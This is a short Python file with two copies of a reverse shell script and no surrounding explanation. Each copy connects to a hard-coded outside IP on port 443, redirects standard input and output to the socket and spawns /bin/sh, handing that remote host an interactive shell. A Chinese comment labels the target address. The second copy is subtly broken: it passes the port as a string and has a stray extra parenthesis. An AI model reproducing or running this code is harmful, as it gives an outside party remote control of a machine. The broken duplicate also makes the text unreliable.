#!/usr/bin/python
# 
import sys,os,socket,pty
# 目标主机的IP地址和端口
target_host = "103.234.72.60"
target_port = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_host, target_port))
os.dup2(s.fileno(), sys.stdin.fileno())
os.dup2(s.fileno(), sys.stdout.fileno())
os.dup2(s.fileno(), sys.stderr.fileno())
pty.spawn('/bin/sh')









#!/usr/bin/python
# 
import sys,os,socket,pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('103.234.72.60', '443')))
os.dup2(s.fileno(), sys.stdin.fileno())
os.dup2(s.fileno(), sys.stdout.fileno())
os.dup2(s.fileno(), sys.stderr.fileno())
pty.spawn('/bin/sh')
